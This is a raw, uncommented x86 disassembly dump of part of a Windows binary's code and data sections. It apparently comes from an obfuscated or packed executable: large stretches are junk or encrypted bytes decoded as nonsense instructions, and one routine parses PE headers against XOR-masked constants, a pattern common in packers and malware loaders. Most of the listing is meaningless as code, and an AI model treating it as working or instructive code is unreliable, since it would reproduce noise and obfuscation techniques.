  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x7968f61e,eax
  411318:	pop    es
  411319:	fbstp  TBYTE PTR [edx+0x49]
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x41132d
  411324:	sub    BYTE PTR [edi+eiz*8],ch
  411327:	inc    esp
  411328:	adc    ah,BYTE PTR [esp+ebp*4+0x7a]
  41132c:	pop    ebp
  41132d:	clc    
  41132e:	fwait
  41132f:	mov    BYTE PTR [ebx],ch
  411331:	retf   
  411332:	add    dh,al
  411334:	repnz mov bh,0xa7
  411337:	xchg   ch,cl
  411339:	scas   al,BYTE PTR es:[edi]
  41133a:	mov    ebx,0xa3732510
  41133f:	push   0x5a
  411341:	iret   
  411342:	adc    al,0x63
  411344:	sahf   
  411345:	loop   0x4112e4
  411347:	inc    edi
  411348:	push   eax
  411349:	mov    ah,BYTE PTR [esi-0x60]
  41134c:	xchg   DWORD PTR [edx],edi
  41134e:	adc    BYTE PTR [ecx+0x8],bh
  411351:	push   edx
  411352:	adc    DWORD PTR [ebx+0x71],esp
  411355:	cs xor eax,esi
  411358:	mov    esp,0x94082e6a
  41135d:	fs gs jne 0x41139a
  411361:	mov    eax,ds:0x568de66e
  411366:	pop    esp
  411367:	xor    eax,DWORD PTR [eax-0x3da3b5f6]
  41136d:	lock fwait
  41136f:	sbb    al,0xf2
  411371:	cmp    al,0xf
  411373:	out    dx,eax
  411374:	fisttp WORD PTR fs:[ecx-0x7492ef77]
  41137b:	xor    eax,0x9c46abfe
  411380:	fst    QWORD PTR [edi+0x15]
  411383:	daa    
  411384:	or     DWORD PTR [edx],0x69531c75
  41138a:	xchg   esi,eax
  41138b:	cld    
  41138c:	es sbb eax,0x72b5e50c
  411392:	test   BYTE PTR [edi+eax*1+0x56],0xcc
  411397:	in     eax,dx
  411398:	arpl   WORD PTR [ebx],ax
  41139a:	outs   dx,BYTE PTR ds:[esi]
  41139b:	int    0x1d
  41139d:	ret    0x6cd1
  4113a0:	push   esi
  4113a1:	retf   0x54d6
  4113a4:	shl    BYTE PTR [esp+edx*2],1
  4113a7:	lods   eax,DWORD PTR ds:[esi]
  4113a8:	pushf  
  4113a9:	or     eax,0xc51ba3e3
  4113ae:	fxch   st(2)
  4113b0:	in     al,dx
  4113b1:	fdiv   DWORD PTR [edx+ebx*2-0xf]
  4113b5:	push   cs
  4113b6:	mov    esp,0x49979daa
  4113bb:	inc    ebx
  4113bc:	cmp    DWORD PTR [eax-0x37],esi
  4113bf:	push   edi
  4113c0:	je     0x411409
  4113c2:	pushf  
  4113c3:	inc    BYTE PTR [esi]
  4113c5:	ss ss jle 0x411402
  4113c9:	jge    0x4113c8
  4113cb:	sar    ebx,1
  4113cd:	cmp    bl,0xbd
  4113d0:	scas   al,BYTE PTR es:[edi]
  4113d1:	xor    esp,DWORD PTR ds:0x6c58f78a
  4113d7:	push   esp
  4113d8:	cwde   
  4113d9:	mov    BYTE PTR [edx+0x66],dh
  4113dc:	inc    ecx
  4113dd:	adc    DWORD PTR [ecx],ebp
  4113df:	(bad)  
  4113e0:	fmul   QWORD PTR [esi]
  4113e2:	xchg   edx,eax
  4113e3:	mov    cl,0x86
  4113e5:	dec    esi
  4113e6:	je     0x4113fe
  4113e8:	mov    al,0x97
  4113ea:	mov    ch,0xa6
  4113ec:	loop   0x4113c8
  4113ee:	push   es
  4113ef:	clc    
  4113f0:	dec    ecx
  4113f1:	push   eax
  4113f2:	xor    al,0xf
  4113f4:	adc    ebx,DWORD PTR [eax+eax*8-0x17]
  4113f8:	ret    
  4113f9:	push   DWORD PTR [edi+0x13]
  4113fc:	sti    
  4113fd:	mov    bh,0xcd
  4113ff:	xor    eax,0xdc5ab6bd
  411404:	mov    es,WORD PTR [edx-0x79f21501]
  41140a:	mov    ah,0x96
  41140c:	jns    0x4113de
  41140e:	push   ebp
  41140f:	repz dec ebx
  411411:	jl     0x4113c4
  411413:	pushf  
  411414:	rol    BYTE PTR [eax+0x4e],1
  411417:	scas   al,BYTE PTR es:[edi]
  411418:	pop    ecx
  411419:	mov    ds:0x33ae9a4b,eax
  41141e:	push   0x968de4f6
  411423:	jno    0x41142f
  411425:	pop    es
  411426:	outs   dx,BYTE PTR ds:[esi]
  411427:	xchg   edx,eax
  411428:	xchg   BYTE PTR [eax],cl
  41142a:	(bad)  
  41142b:	je     0x4114a0
  41142d:	mov    edi,0x3c1094b4
  411432:	stos   BYTE PTR es:[edi],al
  411433:	pop    esp
  411434:	push   0x902eebb1
  411439:	sub    DWORD PTR [ecx-0x73c5ea81],esi
  41143f:	pushf  
  411440:	inc    ecx
  411441:	sahf   
  411442:	mov    DWORD PTR [esi+esi*2],ecx
  411445:	in     al,0x9
  411447:	pop    ds
  411448:	push   esp
  411449:	cmp    al,0xe9
  41144b:	xchg   edi,eax
  41144c:	mov    eax,edi
  41144e:	std    
  41144f:	out    0x59,eax
  411451:	outs   dx,BYTE PTR es:[esi]
  411453:	jo     0x4113e8
  411455:	sub    BYTE PTR [ecx+0x5c],0xdd
  411459:	jmp    0x4862736e
  41145e:	mov    edx,0x571b2f7a
  411463:	xchg   edx,eax
  411464:	out    dx,al
  411465:	mov    edx,edi
  411467:	loopne 0x41143a
  411469:	and    ebx,0x4b0f55a4
  41146f:	adc    bh,BYTE PTR [ebx+ebp*1]
  411472:	rol    DWORD PTR [ebx],0xd2
  411475:	add    bl,bl
  411477:	test   al,0xab
  411479:	or     al,0xf5
  41147b:	sub    DWORD PTR [ebp-0x35a7ad1f],ebx
  411481:	pop    edi
  411482:	inc    ecx
  411483:	addr16 into 
  411485:	out    0x37,al
  411487:	arpl   WORD PTR [edi+0x1f],cx
  41148a:	pop    esi
  41148b:	pushf  
  41148c:	in     eax,0x7
  41148e:	out    0x34,al
  411490:	xor    edx,0x35
  411493:	fisttp QWORD PTR ds:0x7480c07
  411499:	and    ebp,DWORD PTR [edi-0x64d39537]
  41149f:	dec    ebx
  4114a0:	mov    ds:0x62e22933,al
  4114a5:	or     BYTE PTR [ecx-0x18],0x9
  4114a9:	mov    BYTE PTR [ecx-0x14],al
  4114ac:	xchg   ebp,eax
  4114ad:	shr    BYTE PTR [ebx*4+0x7df5aef],cl
  4114b4:	inc    edx
  4114b5:	fadd   QWORD PTR [edi]
  4114b7:	pop    esi
  4114b8:	loope  0x41148f
  4114ba:	dec    ebx
  4114bb:	sti    
  4114bc:	fnstsw WORD PTR [eax+0x16]
  4114bf:	fld    QWORD PTR [esi+0x42d2efdb]
  4114c5:	and    al,0xc
  4114c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114c8:	clc    
  4114c9:	dec    esp
  4114ca:	fcmovnbe st,st(4)
  4114cc:	push   0xffffffe3
  4114ce:	loope  0x411502
  4114d0:	xchg   DWORD PTR [esi-0x27e5cdb2],edx
  4114d6:	cmp    ecx,edi
  4114d8:	loop   0x41154f
  4114da:	jmp    0x5061:0xa152c9e9
  4114e1:	jae    0x411496
  4114e3:	aad    0x81
  4114e5:	lods   al,BYTE PTR ds:[esi]
  4114e6:	pushf  
  4114e7:	ror    DWORD PTR [ebx],1
  4114e9:	ss test eax,0x96f1a32f
  4114ef:	fcom   QWORD PTR ds:0x3988918f
  4114f5:	in     eax,dx
  4114f6:	(bad)
  4114fa:	pusha  
  4114fb:	bound  ebx,QWORD PTR [ecx-0x5c]
  4114fe:	dec    ecx
  4114ff:	rol    edi,cl
  411501:	push   ds
  411502:	int    0x82
  411504:	daa    
  411505:	adc    BYTE PTR [ebp+0x2670b9d3],dh
  41150b:	or     DWORD PTR [eax],edx
  41150d:	into   
  41150e:	addr16 mov ebx,0x67f92079
  411514:	sub    bl,BYTE PTR [edi]
  411516:	dec    esp
  411517:	push   0xffffffa3
  411519:	xor    BYTE PTR [ebx],dh
  41151b:	jnp    0x411525
  41151d:	sbb    al,0x35
  41151f:	mov    cl,0x23
  411521:	add    ch,ah
  411523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411524:	xor    ebx,DWORD PTR [esi-0x1a]
  411527:	push   edx
  411528:	es (bad) 
  41152a:	xor    esp,DWORD PTR [edi]
  41152c:	es inc esi
  41152e:	push   ebx
  41152f:	push   edi
  411530:	scas   al,BYTE PTR es:[edi]
  411531:	rcl    BYTE PTR [ebp-0x7644ceed],0x1a
  411538:	iret   
  411539:	add    cl,BYTE PTR [edi]
  41153b:	xchg   bl,dl
  41153d:	call   0x77f290f6
  411542:	add    esi,DWORD PTR [edx+ebx*1]
  411545:	adc    ah,dh
  411547:	fwait
  411548:	lock lds ebx,FWORD PTR [edx-0x7509619e]
  41154f:	mov    WORD PTR [eax-0x11],?
  411552:	out    dx,al
  411553:	sub    ebx,DWORD PTR [ebx]
  411555:	mov    eax,ss:0x9c8b928c
  41155b:	mov    ch,0x26
  41155d:	pop    ebx
  41155e:	call   0xeae426f6
  411563:	jp     0x41156a
  411565:	mov    DWORD PTR [esi+0x6b],ebx
  411568:	xchg   ecx,eax
  411569:	mov    BYTE PTR [edx+0x6a3c79a7],cl
  41156f:	dec    ch
  411571:	ficom  WORD PTR [edi-0x1bca4176]
  411577:	xchg   ebp,eax
  411578:	and    cl,BYTE PTR [eiz*8-0x2431e339]
  41157f:	mov    DWORD PTR [edx+0x5026c2a4],edx
  411585:	pop    ebp
  411586:	in     eax,0xce
  411588:	repz jl 0x41151b
  41158b:	jne    0x4115f0
  41158d:	add    edi,DWORD PTR [edx-0x3001cc06]
  411593:	stos   DWORD PTR es:[edi],eax
  411594:	add    BYTE PTR [ecx],cl
  411596:	pop    ebx
  411597:	lahf   
  411598:	ret    0x193f
  41159b:	(bad)  
  41159c:	es inc ebx
  41159e:	xor    cl,bh
  4115a0:	imul   edi,DWORD PTR ds:0x1c16c8bb,0x7ad545ac
  4115aa:	ficomp WORD PTR [edx-0x5a]
  4115ad:	adc    ebx,DWORD PTR [eax]
  4115af:	and    BYTE PTR [ebp-0x1bd45ec3],bh
  4115b5:	push   ebp
  4115b6:	test   BYTE PTR ds:0xe7aeb1ac,dh
  4115bc:	icebp  
  4115bd:	fild   DWORD PTR [ebp+0x6f20ab30]
  4115c3:	pop    esp
  4115c4:	sub    ebx,DWORD PTR ds:0x2f4d4e90
  4115ca:	jmpw   0xd3c2
  4115ce:	pusha  
  4115cf:	pop    ecx
  4115d0:	push   ecx
  4115d1:	(bad)  
  4115d2:	stc    
  4115d3:	out    dx,al
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	addr16 pushf 
  41161a:	jmp    0xa47e:0x7e408617
  411621:	jg     0x4116a1
  411623:	jle    0x411653
  411625:	mov    DWORD PTR [edx+edi*4],0xfdf49b4
  41162c:	mov    bl,0xbd
  41162e:	mov    BYTE PTR [ebx],bl
  411630:	mov    esi,0x592fb173
  411635:	mov    al,ds:0xfeb7d728
  41163a:	mov    BYTE PTR [ebp-0x729f3bfc],dl
  411640:	sub    BYTE PTR [edx+eax*8+0xc],0xf7
  411645:	add    esi,esp
  411647:	and    al,0x16
  411649:	dec    esi
  41164a:	mov    DWORD PTR [esi+0xa03101d],edi
  411650:	jle    0x41167d
  411652:	cs das 
  411654:	pusha  
  411655:	(bad)  
  411656:	retf   0x4eab
  411659:	bnd js 0x411647
  41165c:	push   esp
  41165d:	es aad 0x85
  411660:	mov    ecx,0xbe95aeba
  411665:	and    eax,0xce0fce40
  41166a:	cld    
  41166b:	in     al,0xdd
  41166d:	daa    
  41166e:	into   
  41166f:	push   esi
  411670:	lock sub eax,0x4c782a1
  411676:	(bad)  
  411677:	stos   DWORD PTR es:[edi],eax
  411678:	add    bl,BYTE PTR [ebp+0x32644d39]
  41167e:	xlat   BYTE PTR ds:[ebx]
  41167f:	ror    ch,1
  411681:	inc    ebp
  411682:	sub    al,0x40
  411684:	leave  
  411685:	fcmove st,st(0)
  411687:	mov    edi,?
  411689:	mov    ebx,0xf6c13457
  41168e:	sub    al,0x2a
  411690:	or     BYTE PTR [ebp+0x37],cl
  411693:	arpl   WORD PTR [ecx-0x13a942bf],bx
  411699:	inc    edx
  41169a:	pop    esi
  41169b:	(bad)  
  41169c:	and    al,0x21
  41169e:	or     DWORD PTR fs:[edi-0x5],esp
  4116a2:	cwde   
  4116a3:	push   ss
  4116a4:	mov    cl,0x9d
  4116a6:	hlt    
  4116a7:	data16 test BYTE PTR [esi-0x49f28c43],ch
  4116ae:	xchg   ebx,eax
  4116af:	stos   DWORD PTR es:[edi],eax
  4116b0:	mov    BYTE PTR [ebp+0x4d],ah
  4116b3:	pusha  
  4116b4:	mov    BYTE PTR [ebp-0x1f],ch
  4116b7:	ficom  WORD PTR [edi+0x445848b2]
  4116bd:	dec    edi
  4116be:	std    
  4116bf:	pop    edi
  4116c0:	dec    ebx
  4116c1:	pop    edx
  4116c2:	mov    ds:0xcd817151,eax
  4116c7:	jno    0x41173d
  4116c9:	inc    esi
  4116ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116cb:	scas   al,BYTE PTR es:[edi]
  4116cc:	icebp  
  4116cd:	pop    eax
  4116ce:	mov    esp,0xaf2c410c
  4116d3:	mov    edi,0x84ced17c
  4116d8:	inc    eax
  4116d9:	in     eax,0x5a
  4116db:	lods   al,BYTE PTR ds:[esi]
  4116dc:	mov    esp,0xc920efa9
  4116e1:	loope  0x4116a6
  4116e3:	loope  0x4116ef
  4116e5:	in     al,0x46
  4116e7:	popf   
  4116e8:	pop    eax
  4116e9:	fwait
  4116ea:	sub    esp,ecx
  4116ec:	and    bh,cl
  4116ee:	xor    esi,DWORD PTR [esi]
  4116f0:	xchg   esp,eax
  4116f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116f2:	xor    al,0x37
  4116f4:	pusha  
  4116f5:	mov    cl,0xa1
  4116f7:	push   es
  4116f8:	pop    ecx
  4116f9:	dec    ecx
  4116fa:	clc    
  4116fb:	mov    ebp,0x19c54e9
  411700:	push   ds
  411701:	sar    ah,1
  411703:	jp     0x4116bb
  411705:	nop
  411706:	scas   al,BYTE PTR es:[edi]
  411707:	mov    bh,0x3d
  411709:	mov    edi,0x841e641a
  41170e:	loopne 0x41173c
  411710:	adc    ah,dl
  411712:	into   
  411713:	mov    ah,0xb6
  411715:	adc    eax,0xd9f16070
  41171a:	es lock inc esp
  41171d:	int    0x6a
  41171f:	nop
  411720:	ret    
  411721:	inc    esi
  411722:	dec    esp
  411723:	outs   dx,DWORD PTR ds:[esi]
  411724:	add    dl,BYTE PTR [edi]
  411726:	and    BYTE PTR [esi-0x68],bh
  411729:	xor    bh,BYTE PTR [ecx-0x6695e476]
  41172f:	sar    edx,0xd
  411732:	sar    DWORD PTR [ecx+0x35b6752d],0xd8
  411739:	jge    0x411780
  41173b:	scas   al,BYTE PTR es:[edi]
  41173c:	sub    al,BYTE PTR [eax+ebp*2+0x3a780b83]
  411743:	enter  0x96b6,0xa2
  411747:	mov    eax,ds:0x2622fae
  41174c:	pop    eax
  41174d:	push   edi
  41174e:	sub    ah,BYTE PTR [esp+eiz*2+0x36]
  411752:	pusha  
  411753:	xor    DWORD PTR [esi-0x30bc8d32],esp
  411759:	arpl   bx,bx
  41175b:	xlat   BYTE PTR ds:[ebx]
  41175c:	mov    ecx,0x3d0e3001
  411761:	xor    eax,0x7dfe13ae
  411766:	inc    edx
  411767:	rcl    BYTE PTR [edi-0x11203b6e],cl
  41176d:	cs (bad) 
  41176f:	in     al,0x75
  411771:	mov    edi,0x72858e56
  411776:	pop    eax
  411777:	call   0xbd7b:0x79fc441b
  41177e:	jl     0x4117cb
  411780:	lea    eax,[ecx]
  411782:	adc    BYTE PTR [ecx+0x510ba0e4],0x67
  411789:	sar    BYTE PTR [eax-0x5e],1
  41178c:	xor    BYTE PTR ds:0x3131cd57,ch
  411792:	cmp    DWORD PTR [edx+0x4aad6f68],edi
  411798:	(bad)  
  41179a:	add    al,0x53
  41179c:	lods   eax,DWORD PTR ds:[esi]
  41179d:	dec    esi
  41179e:	inc    esi
  41179f:	(bad)  
  4117a0:	(bad)  
  4117a1:	test   bl,0x2
  4117a4:	mov    cs,WORD PTR [edx+eax*4]
  4117a7:	popf   
  4117a8:	sub    dh,ah
  4117aa:	stos   BYTE PTR es:[edi],al
  4117ab:	pop    ds
  4117ac:	das    
  4117ad:	mov    cs,WORD PTR [esi-0x5c]
  4117b0:	xlat   BYTE PTR ds:[ebx]
  4117b1:	push   ebx
  4117b2:	shr    DWORD PTR [esi+0x70ce46e0],cl
  4117b8:	outs   dx,DWORD PTR ds:[esi]
  4117b9:	adc    bh,bl
  4117bb:	cmp    ch,BYTE PTR [ecx+0x62]
  4117be:	cwde   
  4117bf:	cmp    al,0x2
  4117c1:	cwde   
  4117c2:	or     al,0xad
  4117c4:	or     BYTE PTR [ebp+0x77],dh
  4117c7:	push   ecx
  4117c8:	imul   ebx,edi,0xbd9b1a33
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x433723,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x43367f,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43371f,0x433683
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43371f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43369b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43372b,0x0
  41182f:	mov    eax,ds:0x43372b
  411834:	inc    eax
  411835:	mov    ds:0x43372b,eax
  41183a:	cmp    DWORD PTR ds:0x43372b,0xb
  411841:	jne    0x411887
  411847:	push   0x43383c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43372b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43372b
  411899:	inc    eax
  41189a:	mov    ds:0x43372b,eax
  41189f:	cmp    DWORD PTR ds:0x43372b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	out    dx,eax
  4118e8:	or     bl,dh
  4118ea:	inc    ecx
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x4118d7
  4118f4:	push   ds
  4118f5:	push   ebx
  4118f6:	jl     0x41187c
  4118f8:	jno    0x4118c5
  4118fa:	cli    
  4118fb:	std    
  4118fc:	test   DWORD PTR [ebp-0x59dc380],edi
  411902:	push   0x4955b7d5
  411907:	lods   eax,DWORD PTR ds:[esi]
  411908:	mov    esi,0x6ced7bf1
  41190d:	(bad)  
  41190e:	mul    ah
  411910:	mov    BYTE PTR [ebp-0x4e],bh
  411913:	sti    
  411914:	(bad)  
  411915:	es fwait
  411917:	loopne 0x4118de
  411919:	inc    BYTE PTR [esi+0x48]
  41191c:	stos   BYTE PTR es:[edi],al
  41191d:	leave  
  41191e:	call   0x2623567f
  411923:	out    dx,al
  411924:	scas   eax,DWORD PTR es:[edi]
  411925:	or     al,0x26
  411927:	ins    DWORD PTR es:[edi],dx
  411928:	xor    dh,BYTE PTR [ebp-0x2e]
  41192b:	or     BYTE PTR [eax-0x177b761a],bl
  411931:	jp     0x41196c
  411933:	mov    ebx,0x3fec04bf
  411938:	mov    ebx,0x78869303
  41193d:	inc    ebx
  41193e:	xchg   edx,eax
  41193f:	xor    DWORD PTR [ecx-0x5d],esp
  411942:	push   ecx
  411943:	xchg   BYTE PTR [ebx-0x50],ch
  411946:	les    esp,FWORD PTR [esi-0x9]
  411949:	cmp    ch,BYTE PTR [ebx-0x36ec631d]
  41194f:	pop    edi
  411950:	enter  0x80f5,0x5a
  411954:	xchg   edx,eax
  411955:	ds add bl,dh
  411958:	in     al,dx
  411959:	mov    esp,0xeebafc0f
  41195e:	mov    dh,0xef
  411960:	dec    esi
  411961:	cli    
  411962:	adc    DWORD PTR fs:[ecx-0x74],eax
  411966:	inc    ebp
  411967:	clc    
  411968:	loop   0x41190d
  41196a:	sbb    eax,0xd327742c
  41196f:	fild   DWORD PTR [eax-0x7caa48ca]
  411975:	gs dec edi
  411977:	ss jnp 0x4119ad
  41197a:	shl    BYTE PTR [ebx+esi*2+0x4db75ff1],0xfd
  411982:	mov    dl,0x5b
  411984:	sahf   
  411985:	add    BYTE PTR [edx+0x42],bh
  411988:	aas    
  411989:	dec    ebx
  41198a:	mov    BYTE PTR [edi-0x19],ah
  41198d:	fsub   DWORD PTR ds:0x454aef01
  411993:	jbe    0x411a0a
  411995:	fist   WORD PTR [ecx-0x32]
  411998:	mov    esi,0xb1c4b1ba
  41199d:	imul   edx,DWORD PTR [ecx-0x24f41ac7],0xffffffd1
  4119a4:	push   cs
  4119a5:	push   es
  4119a6:	fild   QWORD PTR [ecx+0x280bb80f]
  4119ac:	das    
  4119ad:	iret   
  4119ae:	fistp  WORD PTR [esi-0x45]
  4119b1:	or     al,0x9b
  4119b3:	adc    ebp,0x12
  4119b6:	cmp    eax,0x1525cf13
  4119bb:	retf   
  4119bc:	xor    eax,0xd6c4045a
  4119c1:	and    DWORD PTR [esi],edx
  4119c3:	int    0xfd
  4119c5:	ja     0x41199a
  4119c7:	cmp    ebx,ebx
  4119c9:	pop    esp
  4119ca:	aam    0x60
  4119cc:	icebp  
  4119cd:	arpl   ax,di
  4119cf:	mov    edi,0xffa29312
  4119d4:	jo     0x411965
  4119d6:	cmp    DWORD PTR [edx],edx
  4119d8:	jl     0x4119f5
  4119da:	or     edx,DWORD PTR [ecx+esi*2+0x14]
  4119de:	jnp    0x411988
  4119e0:	jno    0x4119d3
  4119e2:	push   ds
  4119e3:	cli    
  4119e4:	in     al,dx
  4119e5:	push   edi
  4119e6:	inc    edi
  4119e7:	gs cmp al,0x1e
  4119ea:	jbe    0x4119e3
  4119ec:	retf   
  4119ed:	ja     0x411a15
  4119ef:	loope  0x411a3d
  4119f1:	adc    al,0x45
  4119f3:	icebp  
  4119f4:	xchg   edi,eax
  4119f5:	repnz cmp BYTE PTR [esi-0x4600d1c0],ch
  4119fc:	inc    ebp
  4119fd:	push   ecx
  4119fe:	shl    BYTE PTR [ebx+edx*2],1
  411a01:	inc    edx
  411a02:	ret    0x4c26
  411a05:	daa    
  411a06:	rcl    BYTE PTR [ebp+0x603fbdb9],0x5d
  411a0d:	xchg   edi,eax
  411a0e:	cmp    eax,0xf3d38d68
  411a13:	jne    0x411a69
  411a15:	adc    BYTE PTR [edi+0x56eb48e1],dh
  411a1b:	ins    DWORD PTR es:[edi],dx
  411a1c:	neg    BYTE PTR [edi-0x9704835]
  411a22:	iret   
  411a23:	fsubr  DWORD PTR [edi+0xcef58c0]
  411a29:	lods   eax,DWORD PTR ds:[esi]
  411a2a:	leave  
  411a2b:	or     BYTE PTR [ebp-0x26],0xcb
  411a2f:	pop    ebx
  411a30:	cmc    
  411a31:	les    edi,FWORD PTR [edi+edi*8]
  411a34:	mov    esi,0x5621c806
  411a39:	rcl    BYTE PTR [edx-0x7b],1
  411a3c:	sti    
  411a3d:	add    esp,0x34
  411a40:	sbb    DWORD PTR [esp+ebx*1+0x7f331faa],ebx
  411a47:	push   edi
  411a48:	cmp    BYTE PTR [ebp-0x25],ch
  411a4b:	std    
  411a4c:	in     eax,0xdc
  411a4e:	adc    DWORD PTR [eax-0x59afa4ff],edi
  411a54:	dec    eax
  411a55:	jmp    0x40356f93
  411a5a:	sti    
  411a5b:	ss pop bx
  411a5e:	sub    eax,0x25c43ac3
  411a63:	cmp    eax,0x7c1d3892
  411a68:	dec    ecx
  411a69:	mov    ebx,0x5796bd4
  411a6e:	call   0x16fe488e
  411a73:	xor    al,0xea
  411a75:	jmp    0x4fac:0x196b14b2
  411a7c:	lahf   
  411a7d:	mov    cl,BYTE PTR [edx]
  411a7f:	(bad)  
  411a80:	clc    
  411a81:	cwde   
  411a82:	push   0x2e
  411a84:	mov    dh,0xb
  411a86:	cdq    
  411a87:	fst    st(3)
  411a89:	jl     0x9a52750c
  411a8f:	sub    DWORD PTR [ecx-0x27],ebp
  411a92:	jl     0x411aa7
  411a94:	cmp    al,0x95
  411a96:	or     eax,0x1fb3f812
  411a9b:	imul   esi,DWORD PTR [ebx+eax*1+0xde9c1],0x458b0000
  411aa6:	cld    
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
